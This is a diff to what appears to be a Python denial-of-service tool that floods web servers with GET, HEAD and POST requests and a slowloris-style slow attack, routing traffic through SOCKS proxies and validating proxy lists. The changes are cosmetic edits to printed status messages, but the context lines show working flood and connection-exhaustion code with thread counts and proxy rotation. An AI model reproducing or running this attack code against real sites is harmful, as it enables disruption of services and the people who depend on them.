@@ -272,7 +272,7 @@ def cc(event,socks_type):
 					s.send(str.encode(request))
 			except:
 				s.close()
-			print ("[*] CC Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] CC Flooding From | "+str(proxy[0])+":"+str(proxy[1]))
 		except:
 			s.close()
 
@@ -305,7 +305,7 @@ def head(event,socks_type):
 					s.send(str.encode(request))
 			except:
 				s.close()
-			print ("[*] CC Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] CC Flooding From | "+str(proxy[0])+":"+str(proxy[1]))
 		except:
 			s.close()
 
@@ -342,7 +342,7 @@ def post(event,socks_type):
 					s.sendall(str.encode(request))
 			except:
 				s.close()
-			print ("[*] Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] Post Flooding From  | "+str(proxy[0])+":"+str(proxy[1]))
 		except:
 			s.close()
 
@@ -369,23 +369,23 @@ def slow(conn,socks_type):
 			s.send(("Connection:keep-alive").encode("utf-8"))
 			
 			socket_list.append(s)
-			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+			sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 		except:
 			s.close()
 			proxy = Choice(proxies).strip().split(":")
-			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+			sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 	while True:
 		for s in list(socket_list):
 			try:
 				s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
-				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 			except:
 				s.close()
 				socket_list.remove(s)
-				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 		proxy = Choice(proxies).strip().split(":")
 		for _ in range(conn - len(socket_list)):
@@ -406,11 +406,11 @@ def slow(conn,socks_type):
 					s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
 				s.send(("Connection:keep-alive").encode("utf-8"))
 				socket_list.append(s)
-				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 			except:
 				proxy = Choice(proxies).strip().split(":")
-				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+				sys.stdout.write("[*] Running Slow Attack || Connections : "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 				pass
 nums = 0
@@ -462,7 +462,7 @@ def check_socks(ms):
 		th.join()
 		sys.stdout.write("[+] Checked "+str(nums)+" Proxies\r")
 		sys.stdout.flush()
-	print("\r\n[+] Checked all proxies, Total Worked:"+str(len(proxies)))
+	print("\r\n[+] Checked all Proxies Total Worked : "+str(len(proxies)))
 	ans = input("[+] Do U Want To Save Them İn A File ? ( y / n Default = y ) ")
 	if ans == "y" or ans == "":
 		if choice == "4":
@@ -627,7 +627,7 @@ def main():
 				out_file = str(out_file)
 			check_list(out_file)
 			proxies = open(out_file).readlines()
-		print ("[+] Number Of Socks %s Proxies : %s" %(choice,len(proxies)))
+		print ("[+] Number Of Socks%s Proxies : %s" %(choice,len(proxies)))
 		time.sleep(0.03)
 		ans = str(input("[+] Do U Need To Check The Socks List ? ( y / n Default=y ) : "))
 		if ans == "":
@@ -647,7 +647,7 @@ def main():
 	if mode == "slow":	
 		thread_num = str(input("[+] Connections ( Default = 800 ) : "))
 	else:
-		thread_num = str(input("[+] Threads ( Default = 800) : "))
+		thread_num = str(input("[+] Threads ( Default = 800 ) : "))
 	if thread_num == "":
 		thread_num = int(800)
 	else:
@@ -677,7 +677,7 @@ def main():
 			out_file = str(out_file)
 		check_list(out_file)
 		proxies = open(out_file).readlines()
-	print ("[+] Number Of Socks %s Proxies : %s" %(choice,len(proxies)))
+	print ("[+] Number Of Socks%s Proxies : %s" %(choice,len(proxies)))
 	time.sleep(0.03)
 	ans = str(input("[+] Do U Need To Check The Socks List ? ( y / n Default = y ) : "))
 	if ans == "":
@@ -714,7 +714,7 @@ def main():
 		print("[+] Building Threads ")
 		build_threads(mode,thread_num,event,socks_type)
 		event.clear()
-		input("Press Enter to continue.")
+		input("[✓] Press Enter To Continue.")
 		event.set()
 	while True:
 		try:
